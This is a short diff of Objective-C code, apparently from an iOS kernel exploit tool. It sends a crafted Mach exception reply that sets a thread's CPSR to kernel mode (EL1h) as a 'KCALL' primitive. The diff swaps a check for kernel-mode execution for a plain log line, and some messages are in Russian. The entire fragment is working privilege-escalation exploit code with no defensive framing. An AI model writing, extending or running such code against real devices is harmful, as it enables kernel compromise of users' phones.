@@ -2505,14 +2505,7 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                             *(uint32_t *)(rep + 0x2c + 0x108) = 0x3c5;           // cpsr = EL1h
                                             kern_return_t s2 = mach_msg((mach_msg_header_t *)rep, MACH_SEND_MSG, 0x13c, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
                                             kpNote(r, [NSString stringWithFormat:@"  [KCALL] reply kr=0x%x (EL1h pc=spin)", s2]);
-                                            usleep(50000);
-                                            thread_suspend(hp);
-                                            arm_thread_state64_t out;
-                                            mach_msg_type_number_t cnt = ARM_THREAD_STATE64_COUNT;
-                                            thread_get_state(hp, ARM_THREAD_STATE64, (thread_state_t)&out, &cnt);
-                                            kpNote(r, [NSString stringWithFormat:@"  [KCALL] after pc=%#llx → %@",
-                                                      (unsigned long long)(uintptr_t)out.__opaque_pc,
-                                                      ((uint64_t)(uintptr_t)out.__opaque_pc == spin) ? @"KERNEL-MODE SPIN ★★★" : @"иное"]);
+                                            kpNote(r, @"  [KCALL] reply sent — terminate now");
                                         } else {
                                             kpNote(r, @"  [KCALL] не raise_state (id!=2406) — пропуск");
                                         }
